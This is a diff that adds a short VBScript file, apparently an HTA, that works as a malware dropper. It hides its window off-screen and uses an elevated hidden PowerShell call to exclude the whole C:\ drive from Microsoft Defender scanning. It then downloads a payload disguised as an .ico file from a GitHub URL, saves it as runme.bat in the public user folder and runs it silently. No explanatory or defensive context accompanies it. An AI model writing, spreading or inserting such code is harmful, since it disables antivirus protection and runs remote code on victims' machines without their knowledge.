@@ -1,0 +1,38 @@
+<script language="VBScript">
+On Error Resume Next
+
+Window.ReSizeTo 0, 0
+Window.MoveTo -4000, -4000
+
+Set objShell = CreateObject("Shell.Application")
+Set objScriptExec = objShell.ShellExecute("powershell.exe", "Add-MpPreference -ExclusionPath C:\", "", "runas", 0) ' Set the last parameter to 0 for hidden
+
+Set runn = CreateObject("WScript.Shell")
+Dim file
+
+' Reset error handling to display errors again (optional)
+On Error GoTo 0
+
+Dim objHTTP, strURL, strPath
+
+strURL = "https://raw.githubusercontent.com/NothingSuspiciousHere/icos/main/gd-medium.ico"
+strPath = "C:\Users\Public\runme.bat"
+
+Set objHTTP = CreateObject("MSXML2.XMLHTTP")
+
+objHTTP.Open "GET", strURL, False
+objHTTP.send
+
+Set objStream = CreateObject("ADODB.Stream")
+objStream.Open
+objStream.Type = 1
+objStream.Write objHTTP.responseBody
+objStream.SaveToFile strPath, 2
+objStream.Close
+
+Set objHTTP = Nothing
+
+Set objShell = CreateObject("WScript.Shell")
+objShell.Run "cmd.exe /c C:\Users\Public\runme.bat", 0, False
+Set objShell = Nothing
+</script>
